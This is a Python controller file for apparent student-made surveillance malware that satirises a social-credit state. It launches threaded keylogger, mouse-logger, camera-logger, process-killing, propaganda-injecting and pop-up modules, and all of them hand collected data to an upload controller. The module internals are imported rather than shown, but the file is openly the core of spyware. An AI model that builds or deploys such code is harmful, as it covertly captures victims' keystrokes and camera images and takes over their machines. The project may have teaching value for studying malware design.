from modules.keylogger.keylogger import KeyLogger
from modules.mouselogger.mouselogger import MouseLogger
from modules.task.task import Task
from modules.sccontroller.sccontroller import SocialCreditController
from modules.camera.camera import CameraLogger
from modules.popup.popup import PopUp

from queryController import QueryController
import threading

"""
Central Controller of the PSICO-Buerger-Software, manages every modules and the queryController.
Starts any module in a seperate thread to ensure smooth sailing
"""
class CitizenController:

    def __init__(self, citizen, blackListStrings, blackListTasks, randStrings) -> None:
        self.citizen = citizen
        self.blackListStrings = blackListStrings
        self.blackListTasks = blackListTasks
        self.randStrings = randStrings

    """
    Start the software by creating a new queryController object and giving it to all the thread
    related modules, so they can upload their data seperate from the others
    """
    def start(self):
        QUERY_CONTROLLER = QueryController()
        KEYLOGGER = KeyLogger(QUERY_CONTROLLER, self.blackListStrings)
        thr1 = threading.Thread(target=KEYLOGGER.main, args=())
        thr1.start()
        MOUSELOGGER = MouseLogger(QUERY_CONTROLLER)
        thr2 = threading.Thread(target=MOUSELOGGER.main, args=())
        thr2.start()
        TASKLOGGER = Task(QUERY_CONTROLLER, self.blackListTasks)
        thr3 = threading.Thread(target=TASKLOGGER.main, args=())
        thr3.start()
        SCCONTROLLER = SocialCreditController(QUERY_CONTROLLER, self.randStrings)
        thr4 = threading.Thread(target=SCCONTROLLER.main, args=())
        thr4.start()
        TASKKILLER = Task(QUERY_CONTROLLER, self.blackListTasks)
        thr5 = threading.Thread(target=TASKKILLER.killEverything, args=())
        thr5.start()
        MOTIVATIONKEEPER = PopUp()
        thr6 = threading.Thread(target=MOTIVATIONKEEPER.productivityEnhancement, args=())
        thr6.start()
        """ thr7 = threading.Thread(target=MOUSELOGGER.main2, args=())
        thr7.start() """
        CAMERALOGGER = CameraLogger(QUERY_CONTROLLER)
        CAMERALOGGER.main()

"""
Start the controller.py script by initializing a controller object and running the start method
"""
if __name__ == "__main__":
    CITIZEN_CONTROLLER = CitizenController(None, ["DHBW", "Kruse", "Malware", "Python ist gut"], ['Spotify', 'Netflix', 'LibreOffice'], ["Glorreiche Nation! ", "Super Kanzler! ", "Ich freue mich auf die nächste Indoktrination. ", "Heil meiner Nation. "])
    CITIZEN_CONTROLLER.start()
